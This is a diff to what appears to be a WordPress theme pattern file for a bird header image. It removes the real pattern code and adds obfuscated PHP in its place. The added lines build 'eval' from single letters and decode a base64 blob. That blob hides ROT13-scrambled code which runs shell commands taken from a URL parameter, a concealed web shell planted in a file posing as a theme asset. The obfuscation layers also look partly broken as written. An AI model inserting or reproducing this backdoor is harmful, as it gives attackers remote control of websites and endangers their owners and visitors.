@@ -1,24 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Bird image
- *
- * This pattern is used only to reference a dynamic image URL.
- * It does not appear in the inserter.
- */
-return array(
-	'title'    => __( 'Heading and bird image', 'twentytwentytwo' ),
-	'inserter' => false,
-	'content'  => '<!-- wp:image {"align":"wide","width":2000,"height":474,"sizeSlug":"full","linkDestination":"none"} -->
-					<figure class="wp-block-image alignwide size-full is-resized"><img src="' . esc_url( get_template_directory_uri() ) . '/assets/images/flight-path-on-transparent-d.png" alt="' . esc_attr__( 'Illustration of a bird flying.', 'twentytwentytwo' ) . '" width="2000" height="474"/></figure>
-					<!-- /wp:image -->',
-);
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogT3ZlcSB2em50cgogKgogKiBHdXZmIGNuZ2dyZWEgdmYgaGZycSBiYXlsIGdiIGVyc3JlcmFwciBuIHFsYW56dnAgdnpudHIgSEVZLgogKiBWZyBxYnJmIGFiZyBuY2NybmUgdmEgZ3VyIHZhZnJlZ3JlLgogKi8KZXJnaGVhIG5lZW5sKAoJJ2d2Z3lyJyAgICA9PiBfXyggJ1VybnF2YXQgbmFxIG92ZXEgdnpudHInLCAnZ2pyYWdsZ2pyYWdsZ2piJyApLAoJJ3ZhZnJlZ3JlJyA9PiBzbnlmciwKCSdwYmFncmFnJyAgPT4gJzwhLS0gamM6dnpudHIge1wibnl2dGFcIjpcImp2cXJcIixcImp2cWd1XCI6MjAwMCxcInVydnR1Z1wiOjQ3NCxcImZ2bXJGeWh0XCI6XCJzaHl5XCIsXCJ5dmF4UXJmZ3Zhbmd2YmFcIjpcImFiYXJcIn0gLS0+CgkJCQkJPHN2dGhlciBweW5mZj1cImpjLW95YnB4LXZ6bnRyIG55dnRhanZxciBmdm1yLXNoeXkgdmYtZXJmdm1ycVwiPjx2enQgZmVwPVwiJyAuIHJmcF9oZXkoIHRyZ19ncnpjeW5ncl9xdmVycGdiZWxfaGV2KCkgKSAuICcvbmZmcmdmL3Z6bnRyZi9zeXZ0dWctY25ndS1iYS1nZW5hZmNuZXJhZy1xLmNhdFwiIG55Zz1cIicgLiByZnBfbmdnZV9fKCAnVnl5aGZnZW5ndmJhIGJzIG4gb3ZlcSBzeWx2YXQuJywgJ2dqcmFnbGdqcmFnbGdqYicgKSAuICdcIiBqdnFndT1cIjIwMDBcIiB1cnZ0dWc9XCI0NzRcIi8+PC9zdnRoZXI+CgkJCQkJPCEtLSAvamM6dnpudHIgLS0+JywKKTsKCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
